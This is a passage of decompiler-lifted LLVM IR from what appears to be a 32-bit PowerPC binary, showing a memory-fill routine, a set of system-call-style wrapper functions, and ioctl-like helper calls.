  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 2, 0, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_100085e8.dec_label_pc_100085e8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100085c0, { 1, 0 }
  uselistorder label %dec_label_pc_100085a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008578, { 1, 0 }
}

define i32 @function_10008608(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008608:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10008608 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10008608, i32* %r9.global-to-local, align 4
  %v4_10008608 = icmp eq i32 %v1_10008608, 0
  %v1_10008610 = add i32 %arg1, -4
  store i32 %v1_10008610, i32* %r11.global-to-local, align 4
  %v1_10008614 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10008618 = call i32 @__asm_rlwimi(i32 %v1_10008614, i32 16, i32 0, i32 15)
  %v2_10008618 = trunc i32 %v1_10008618 to i8
  br i1 %v4_10008608, label %dec_label_pc_10008640, label %dec_label_pc_10008620

dec_label_pc_10008620:                            ; preds = %dec_label_pc_10008608
  %v0_10008620 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008620 = urem i32 %v0_10008620, 4
  %v3_10008620 = icmp eq i32 %v1_10008620, 0
  br i1 %v3_10008620, label %dec_label_pc_10008620.dec_label_pc_10008628_crit_edge, label %dec_label_pc_10008670

dec_label_pc_10008620.dec_label_pc_10008628_crit_edge: ; preds = %dec_label_pc_10008620
  %v0_10008628.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008628

dec_label_pc_10008628:                            ; preds = %dec_label_pc_10008688.dec_label_pc_10008628_crit_edge, %dec_label_pc_10008620.dec_label_pc_10008628_crit_edge
  %v0_1000862c.pre = phi i32 [ %v0_10008620, %dec_label_pc_10008620.dec_label_pc_10008628_crit_edge ], [ %v0_1000862c.pre.pre, %dec_label_pc_10008688.dec_label_pc_10008628_crit_edge ]
  %v0_10008628 = phi i32 [ %v0_10008628.pre, %dec_label_pc_10008620.dec_label_pc_10008628_crit_edge ], [ %v1_10008688, %dec_label_pc_10008688.dec_label_pc_10008628_crit_edge ]
  store i32 %v0_10008628, i32* %ctr.global-to-local, align 4
  %v1_10008630 = sext i8 %v2_10008618 to i32
  br label %dec_label_pc_1000862c

dec_label_pc_1000862c:                            ; preds = %dec_label_pc_1000862c, %dec_label_pc_10008628
  %v0_1000862c = phi i32 [ %v1_10008638, %dec_label_pc_1000862c ], [ %v0_1000862c.pre, %dec_label_pc_10008628 ]
  %v1_1000862c = add i32 %v0_1000862c, 4
  store i32 %v1_1000862c, i32* %r9.global-to-local, align 4
  %v4_10008630 = inttoptr i32 %v1_1000862c to i32*
  store i32 %v1_10008630, i32* %v4_10008630, align 4
  %v2_10008634 = load i32, i32* %r9.global-to-local, align 4
  %v3_10008634 = add i32 %v2_10008634, 4
  %v4_10008634 = inttoptr i32 %v3_10008634 to i32*
  store i32 %v1_10008630, i32* %v4_10008634, align 4
  %v0_10008638 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008638 = add i32 %v0_10008638, 4
  store i32 %v1_10008638, i32* %r11.global-to-local, align 4
  %v0_1000863c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000863c = add i32 %v0_1000863c, -1
  store i32 %v1_1000863c, i32* %ctr.global-to-local, align 4
  %v2_1000863c = icmp eq i32 %v1_1000863c, 0
  br i1 %v2_1000863c, label %dec_label_pc_10008640, label %dec_label_pc_1000862c

dec_label_pc_10008640:                            ; preds = %dec_label_pc_1000862c, %dec_label_pc_10008688, %dec_label_pc_10008608
  %v0_10008640 = load i32, i32* %r5.global-to-local, align 4
  %v1_10008640 = urem i32 %v0_10008640, 8
  store i32 %v1_10008640, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10008640, 4
  br i1 %tmp, label %dec_label_pc_10008654, label %dec_label_pc_1000864c

dec_label_pc_1000864c:                            ; preds = %dec_label_pc_10008640
  %v1_1000864c = sext i8 %v2_10008618 to i32
  %v2_1000864c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000864c = add i32 %v2_1000864c, 4
  %v4_1000864c = inttoptr i32 %v3_1000864c to i32*
  store i32 %v1_1000864c, i32* %v4_1000864c, align 4
  store i32 %v3_1000864c, i32* %r11.global-to-local, align 4
  %v0_10008650 = load i32, i32* @r5, align 4
  %v1_10008650 = add i32 %v0_10008650, -4
  store i32 %v1_10008650, i32* @r5, align 4
  br label %dec_label_pc_10008654

dec_label_pc_10008654:                            ; preds = %dec_label_pc_10008640, %dec_label_pc_1000864c
  %v0_10008654 = phi i32 [ %v1_10008640, %dec_label_pc_10008640 ], [ %v1_10008650, %dec_label_pc_1000864c ]
  %v3_10008654 = icmp eq i32 %v0_10008654, 0
  %v0_10008658 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10008654, i32 %v0_10008658)
  %v0_1000865c = load i32, i32* @r5, align 4
  store i32 %v0_1000865c, i32* %ctr.global-to-local, align 4
  %v0_10008660 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008660 = add i32 %v0_10008660, 3
  store i32 %v1_10008660, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008664

dec_label_pc_10008664:                            ; preds = %dec_label_pc_10008664, %dec_label_pc_10008654
  %v3_10008664 = phi i32 [ %v4_10008664, %dec_label_pc_10008664 ], [ %v1_10008660, %dec_label_pc_10008654 ]
  %v4_10008664 = add i32 %v3_10008664, 1
  %v5_10008664 = inttoptr i32 %v4_10008664 to i8*
  store i8 %v2_10008618, i8* %v5_10008664, align 1
  store i32 %v4_10008664, i32* %r9.global-to-local, align 4
  %v0_10008668 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008668 = add i32 %v0_10008668, -1
  store i32 %v1_10008668, i32* %ctr.global-to-local, align 4
  %v2_10008668 = icmp eq i32 %v1_10008668, 0
  br i1 %v2_10008668, label %dec_label_pc_10008694, label %dec_label_pc_10008664

dec_label_pc_10008670:                            ; preds = %dec_label_pc_10008620
  %v1_10008670 = sub nsw i32 4, %v1_10008620
  store i32 %v1_10008670, i32* %ctr.global-to-local, align 4
  %v1_10008678 = load i32, i32* %r5.global-to-local, align 4
  %v2_10008678 = sub i32 %v1_10008678, %v1_10008670
  store i32 %v2_10008678, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000867c

dec_label_pc_1000867c:                            ; preds = %dec_label_pc_1000867c, %dec_label_pc_10008670
  %v3_1000867c = phi i32 [ %v1_10008680, %dec_label_pc_1000867c ], [ %v0_10008620, %dec_label_pc_10008670 ]
  %v4_1000867c = add i32 %v3_1000867c, 4
  %v5_1000867c = inttoptr i32 %v4_1000867c to i8*
  store i8 %v2_10008618, i8* %v5_1000867c, align 1
  %v0_10008680 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008680 = add i32 %v0_10008680, 1
  store i32 %v1_10008680, i32* %r11.global-to-local, align 4
  %v0_10008684 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008684 = add i32 %v0_10008684, -1
  store i32 %v1_10008684, i32* %ctr.global-to-local, align 4
  %v2_10008684 = icmp eq i32 %v1_10008684, 0
  br i1 %v2_10008684, label %dec_label_pc_10008688, label %dec_label_pc_1000867c

dec_label_pc_10008688:                            ; preds = %dec_label_pc_1000867c
  %v0_10008688 = load i32, i32* %r5.global-to-local, align 4
  %v1_10008688 = call i32 @__asm_rlwinm.(i32 %v0_10008688, i32 29, i32 3, i32 31)
  store i32 %v1_10008688, i32* %r9.global-to-local, align 4
  %v4_10008688 = icmp eq i32 %v1_10008688, 0
  br i1 %v4_10008688, label %dec_label_pc_10008640, label %dec_label_pc_10008688.dec_label_pc_10008628_crit_edge

dec_label_pc_10008688.dec_label_pc_10008628_crit_edge: ; preds = %dec_label_pc_10008688
  %v0_1000862c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008628

dec_label_pc_10008694:                            ; preds = %dec_label_pc_10008664
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10008688, { 1, 2, 0 }
  uselistorder i32 %v1_10008684, { 1, 0 }
  uselistorder i32 %v1_10008680, { 1, 0 }
  uselistorder i32 %v1_10008668, { 1, 0 }
  uselistorder i32 %v4_10008664, { 1, 2, 0 }
  uselistorder i32 %v1_10008640, { 2, 1, 0 }
  uselistorder i32 %v1_1000863c, { 1, 0 }
  uselistorder i32 %v1_10008638, { 1, 0 }
  uselistorder i32 %v1_10008620, { 1, 0 }
  uselistorder i32 %v0_10008620, { 2, 1, 0 }
  uselistorder i8 %v2_10008618, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 37, 38, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder label %dec_label_pc_10008654, { 1, 0 }
  uselistorder label %dec_label_pc_10008640, { 1, 0, 2 }
}

define i32 @function_10008698(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008698:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000869c = load i32, i32* @lr, align 4
  store i32 %v0_1000869c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100086ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 268469952, i32* @lr, align 4
  %v3_100086bc = call i32 @function_10007b50(i32 1076655123, i32 %v2_100086ac, i32 %v2_100086ac)
  %v2_100086c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100086c0, i32* @r4, align 4
  store i32 %v3_100086bc, i32* @r30, align 4
  %v3_100086c4 = icmp eq i32 %v3_100086bc, 0
  %v0_100086cc = load i32, i32* @r31, align 4
  br i1 %v3_100086c4, label %dec_label_pc_100086d4, label %dec_label_pc_1000871c

dec_label_pc_100086d4:                            ; preds = %dec_label_pc_10008698
  %v1_100086cc = add i32 %v0_100086cc, 17
  %v3_100086ec = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_100086ec, i32* %r0.global-to-local, align 4
  %v2_100086f0 = add i32 %v0_100086cc, 4
  %v3_100086f0 = inttoptr i32 %v2_100086f0 to i32*
  store i32 %tmp7, i32* %v3_100086f0, align 4
  %v0_100086f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100086f4 = load i32, i32* @r31, align 4
  %v2_100086f4 = inttoptr i32 %v1_100086f4 to i32*
  store i32 %v0_100086f4, i32* %v2_100086f4, align 4
  %v0_100086f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100086f8 = load i32, i32* @r31, align 4
  %v2_100086f8 = add i32 %v1_100086f8, 8
  %v3_100086f8 = inttoptr i32 %v2_100086f8 to i32*
  store i32 %v0_100086f8, i32* %v3_100086f8, align 4
  %v0_100086fc = load i32, i32* %r10.global-to-local, align 4
  %v1_100086fc = load i32, i32* @r31, align 4
  %v2_100086fc = add i32 %v1_100086fc, 12
  %v3_100086fc = inttoptr i32 %v2_100086fc to i32*
  store i32 %v0_100086fc, i32* %v3_100086fc, align 4
  %v3_10008700 = load i32, i32* @r31, align 4
  %v4_10008700 = add i32 %v3_10008700, 16
  %v5_10008700 = inttoptr i32 %v4_10008700 to i8*
  store i8 %tmp4, i8* %v5_10008700, align 1
  %v1_10008704 = load i32, i32* @r31, align 4
  %v2_10008704 = add i32 %v1_10008704, 52
  %v3_10008704 = inttoptr i32 %v2_10008704 to i32*
  store i32 %tmp3, i32* %v3_10008704, align 4
  %v1_10008708 = load i32, i32* @r31, align 4
  %v2_10008708 = add i32 %v1_10008708, 56
  %v3_10008708 = inttoptr i32 %v2_10008708 to i32*
  store i32 %tmp2, i32* %v3_10008708, align 4
  store i32 268470032, i32* @lr, align 4
  %v6_1000870c = sext i8 %tmp4 to i32
  %v8_1000870c = call i32 @function_1000a318(i32 %v1_100086cc, i32 %v2_100086c0, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000870c, i32 %tmp7)
  store i32 268470044, i32* @lr, align 4
  %v3_10008718 = call i32 @function_10008608(i32 %v8_1000870c, i32 0, i32 13)
  %v0_10008720.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000871c

dec_label_pc_1000871c:                            ; preds = %dec_label_pc_10008698, %dec_label_pc_100086d4
  %v0_10008720 = phi i32 [ %v3_100086bc, %dec_label_pc_10008698 ], [ %v0_10008720.pre, %dec_label_pc_100086d4 ]
  store i32 %v0_1000869c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008720

; uselistorder directives
  uselistorder i32 %v2_100086ac, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 4, 5, 6, 11, 0, 12, 7, 8, 9, 10, 13, 14, 1, 15, 16, 2, 17, 18, 3 }
  uselistorder label %dec_label_pc_1000871c, { 1, 0 }
}

define i32 @function_10008734() local_unnamed_addr {
dec_label_pc_10008734:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10008734 = load i32, i32* @r4, align 4
  %v3_10008734 = icmp eq i32 %v0_10008734, 1
  %v0_10008744 = load i32, i32* @r3, align 4
  store i32 %v0_10008744, i32* @r27, align 4
  %v0_1000874c = load i32, i32* @r5, align 4
  store i32 %v0_1000874c, i32* @r31, align 4
  br i1 %v3_10008734, label %dec_label_pc_10008770, label %dec_label_pc_10008754

dec_label_pc_10008754:                            ; preds = %dec_label_pc_10008734
  %v3_10008754 = icmp eq i32 %v0_10008734, 2
  br i1 %v3_10008754, label %dec_label_pc_10008790, label %dec_label_pc_1000875c

dec_label_pc_1000875c:                            ; preds = %dec_label_pc_10008754
  %v3_1000875c = icmp eq i32 %v0_10008734, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000875c, label %dec_label_pc_10008798, label %dec_label_pc_1000877c

dec_label_pc_10008770:                            ; preds = %dec_label_pc_10008734
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_10008798

dec_label_pc_1000877c:                            ; preds = %dec_label_pc_1000875c
  %v0_1000877c = call i32 @function_10008484()
  store i32 -1, i32* @r28, align 4
  %v2_10008788 = inttoptr i32 %v0_1000877c to i32*
  store i32 22, i32* %v2_10008788, align 4
  br label %dec_label_pc_10008880

dec_label_pc_10008790:                            ; preds = %dec_label_pc_10008754
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_10008798

dec_label_pc_10008798:                            ; preds = %dec_label_pc_1000875c, %dec_label_pc_10008770, %dec_label_pc_10008790
  %v1_10008798 = inttoptr i32 %v0_1000874c to i32*
  %v2_10008798 = load i32, i32* %v1_10008798, align 4
  store i32 19, i32* @r5, align 4
  %v1_100087a0 = add i32 %v0_1000874c, 4
  %v2_100087a0 = inttoptr i32 %v1_100087a0 to i32*
  %v3_100087a0 = load i32, i32* %v2_100087a0, align 4
  store i32 %v3_100087a0, i32* %r9.global-to-local, align 4
  %v1_100087a4 = add i32 %v0_1000874c, 17
  store i32 %v1_100087a4, i32* @r4, align 4
  %v1_100087a8 = add i32 %v0_1000874c, 8
  %v2_100087a8 = inttoptr i32 %v1_100087a8 to i32*
  %v3_100087a8 = load i32, i32* %v2_100087a8, align 4
  %v2_100087ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100087ac, i32* @r3, align 4
  %v2_100087b4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_100087b4, i32* @r26, align 4
  store i32 %v2_10008798, i32* %stack_var_-72, align 4
  store i32 268470244, i32* @lr, align 4
  %v0_100087e0 = call i32 @function_100084c8()
  %v0_100087e4 = load i32, i32* @r27, align 4
  %v0_100087e8 = load i32, i32* @r30, align 4
  store i32 268470264, i32* @lr, align 4
  %v3_100087f4 = call i32 @function_10007b50(i32 %v0_100087e4, i32 %v0_100087e8, i32 %v2_100087b4)
  store i32 %v3_100087f4, i32* @r28, align 4
  %v3_100087f8 = icmp eq i32 %v3_100087f4, 0
  br i1 %v3_100087f8, label %dec_label_pc_10008800, label %dec_label_pc_10008880

dec_label_pc_10008800:                            ; preds = %dec_label_pc_10008798
  %v0_10008800 = load i32, i32* @r30, align 4
  %v3_10008804 = icmp eq i32 %v0_10008800, -2144570348
  br i1 %v3_10008804, label %dec_label_pc_1000880c, label %dec_label_pc_1000887c

dec_label_pc_1000880c:                            ; preds = %dec_label_pc_10008800
  %v0_1000880c = call i32 @function_10008484()
  store i32 %v0_1000880c, i32* @r29, align 4
  %v0_1000881c = load i32, i32* @r27, align 4
  %v1_10008824 = inttoptr i32 %v0_1000880c to i32*
  %v2_10008824 = load i32, i32* %v1_10008824, align 4
  store i32 %v2_10008824, i32* @r30, align 4
  store i32 268470320, i32* @lr, align 4
  %v3_1000882c = call i32 @function_10007b50(i32 %v0_1000881c, i32 1076655123, i32 %v2_100087b4)
  %v3_10008830 = icmp eq i32 %v3_1000882c, 0
  br i1 %v3_10008830, label %dec_label_pc_10008840, label %dec_label_pc_10008838

dec_label_pc_10008838:                            ; preds = %dec_label_pc_1000880c
  %v0_10008838 = load i32, i32* @r30, align 4
  %v1_10008838 = load i32, i32* @r29, align 4
  %v2_10008838 = inttoptr i32 %v1_10008838 to i32*
  store i32 %v0_10008838, i32* %v2_10008838, align 4
  br label %dec_label_pc_10008880

dec_label_pc_10008840:                            ; preds = %dec_label_pc_1000880c
  %v0_10008840 = load i32, i32* @r31, align 4
  %v1_10008840 = add i32 %v0_10008840, 8
  %v2_10008840 = inttoptr i32 %v1_10008840 to i32*
  %v3_10008840 = load i32, i32* %v2_10008840, align 4
  %v1_10008848 = call i32 @__asm_rlwinm(i32 %v3_10008840, i32 0, i32 19, i32 20)
  %v1_1000884c = call i32 @__asm_rlwinm(i32 %v3_100087a8, i32 0, i32 19, i32 20)
  store i32 %v1_1000884c, i32* %r9.global-to-local, align 4
  %v4_10008850 = icmp eq i32 %v1_10008848, %v1_1000884c
  br i1 %v4_10008850, label %dec_label_pc_10008858, label %dec_label_pc_1000886c

dec_label_pc_10008858:                            ; preds = %dec_label_pc_10008840
  %v1_10008858 = and i32 %v3_10008840, 768
  store i32 %v1_10008858, i32* %r9.global-to-local, align 4
  %v3_10008858 = icmp eq i32 %v1_10008858, 0
  br i1 %v3_10008858, label %dec_label_pc_1000887c, label %dec_label_pc_10008860

dec_label_pc_10008860:                            ; preds = %dec_label_pc_10008858
  %v1_10008860 = call i32 @__asm_rlwinm(i32 %v3_100087a8, i32 0, i32 22, i32 23)
  %v0_10008864 = load i32, i32* %r9.global-to-local, align 4
  %v4_10008864 = icmp eq i32 %v0_10008864, %v1_10008860
  br i1 %v4_10008864, label %dec_label_pc_1000887c, label %dec_label_pc_1000886c

dec_label_pc_1000886c:                            ; preds = %dec_label_pc_10008840, %dec_label_pc_10008860
  store i32 -1, i32* @r28, align 4
  %v1_10008874 = load i32, i32* @r29, align 4
  %v2_10008874 = inttoptr i32 %v1_10008874 to i32*
  store i32 22, i32* %v2_10008874, align 4
  br label %dec_label_pc_10008880

dec_label_pc_1000887c:                            ; preds = %dec_label_pc_10008800, %dec_label_pc_10008860, %dec_label_pc_10008858
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10008880

dec_label_pc_10008880:                            ; preds = %dec_label_pc_10008798, %dec_label_pc_1000886c, %dec_label_pc_10008838, %dec_label_pc_1000877c, %dec_label_pc_1000887c
  %v0_10008884 = load i32, i32* @r28, align 4
  ret i32 %v0_10008884

; uselistorder directives
  uselistorder i32 %v0_1000874c, { 1, 0, 3, 2, 4 }
  uselistorder i32 768, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10007b50, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10008880, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000887c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000886c, { 1, 0 }
  uselistorder label %dec_label_pc_10008798, { 2, 1, 0 }
}

define i32 @function_10008898(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008898:
  %stack_var_-24 = alloca i32, align 4
  %v2_100088a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100088a0, i32* @r4, align 4
  store i32 268470444, i32* @lr, align 4
  %v1_100088a8 = bitcast i32* %stack_var_-24 to i8*
  %v2_100088a8 = call i32 @function_1000a34c(i8* %v1_100088a8)
  %v3_100088ac = icmp eq i32 %v2_100088a8, 0
  br i1 %v3_100088ac, label %dec_label_pc_100088bc, label %dec_label_pc_100088b8

dec_label_pc_100088b8:                            ; preds = %dec_label_pc_10008898
  %v3_100088b8 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100088bc

dec_label_pc_100088bc:                            ; preds = %dec_label_pc_10008898, %dec_label_pc_100088b8
  %v0_100088c8 = phi i32 [ -1, %dec_label_pc_10008898 ], [ %v3_100088b8, %dec_label_pc_100088b8 ]
  ret i32 %v0_100088c8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100088bc, { 1, 0 }
}

define i32 @function_100088cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100088cc:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100088e0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470512, i32* @lr, align 4
  %v2_100088ec = call i32 @function_10009c1c(i32 5, i32 %v2_100088e0)
  ret i32 %v2_100088ec

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10008900(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008900:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10008914 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470564, i32* @lr, align 4
  %v2_10008920 = call i32 @function_10009c1c(i32 2, i32 %v2_10008914)
  ret i32 %v2_10008920

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10008934() local_unnamed_addr {
dec_label_pc_10008934:
  %stack_var_-24 = alloca i32, align 4
  %v0_1000893c = load i32, i32* @r3, align 4
  store i32 %v0_1000893c, i32* %stack_var_-24, align 4
  %v2_10008948 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470616, i32* @lr, align 4
  %v2_10008954 = call i32 @function_10009c1c(i32 3, i32 %v2_10008948)
  ret i32 %v2_10008954

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10008968(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008968:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000897c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470668, i32* @lr, align 4
  %v2_10008988 = call i32 @function_10009c1c(i32 6, i32 %v2_1000897c)
  ret i32 %v2_10008988

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000899c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000899c:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_100089b0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268470728, i32* @lr, align 4
  %v2_100089c4 = call i32 @function_10009c1c(i32 15, i32 %v2_100089b0)
  ret i32 %v2_100089c4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 15, { 0, 23, 6, 7, 13, 2, 1, 14, 15, 8, 9, 10, 11, 12, 16, 17, 18, 3, 19, 20, 4, 21, 22, 5 }
}

define i32 @function_100089d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100089d8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100089ec = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470776, i32* @lr, align 4
  %v2_100089f4 = call i32 @function_10009c1c(i32 4, i32 %v2_100089ec)
  ret i32 %v2_100089f4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10008a08(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008a08:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10008a1c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470832, i32* @lr, align 4
  %v2_10008a2c = call i32 @function_10009c1c(i32 10, i32 %v2_10008a1c)
  ret i32 %v2_10008a2c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_10008a40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10008a40:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008a54 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268470896, i32* @lr, align 4
  %v2_10008a6c = call i32 @function_10009c1c(i32 12, i32 %v2_10008a54)
  ret i32 %v2_10008a6c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10008a80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008a80:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10008a94 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268470952, i32* @lr, align 4
  %v2_10008aa4 = call i32 @function_10009c1c(i32 9, i32 %v2_10008a94)
  ret i32 %v2_10008aa4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 9, { 2, 3, 4, 5, 18, 6, 7, 19, 20, 0, 8, 9, 10, 21, 11, 12, 13, 14, 15, 22, 16, 29, 23, 24, 25, 26, 27, 28, 30, 31, 32, 17, 1, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
}

define i32 @function_10008ab8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10008ab8:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008acc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268471016, i32* @lr, align 4
  %v2_10008ae4 = call i32 @function_10009c1c(i32 11, i32 %v2_10008acc)
  ret i32 %v2_10008ae4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10008af8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10008af8:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10008b0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268471076, i32* @lr, align 4
  %v2_10008b20 = call i32 @function_10009c1c(i32 14, i32 %v2_10008b0c)
  ret i32 %v2_10008b20

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_10008b34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008b34:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10008b48 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268471128, i32* @lr, align 4
  %v2_10008b54 = call i32 @function_10009c1c(i32 1, i32 %v2_10008b48)
  ret i32 %v2_10008b54

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10009c1c, { 5, 4, 6, 3, 7, 2, 9, 1, 11, 0, 8, 10 }
}

define i32 @function_10008b68(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008b68:
  %v0_10008b68 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268471168, i32* @lr, align 4
  %v0_10008b7c = call i32 @function_10007df8()
  %v0_10008b84 = load i32, i32* @r29, align 4
  store i32 %v0_10008b68, i32* @lr, align 4
  %v2_10008b94 = call i32 @function_10007e88(i32 %v0_10008b7c, i32 %v0_10008b84)
  ret i32 %v2_10008b94

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10007e88, { 5, 4, 3, 2, 1, 0 }
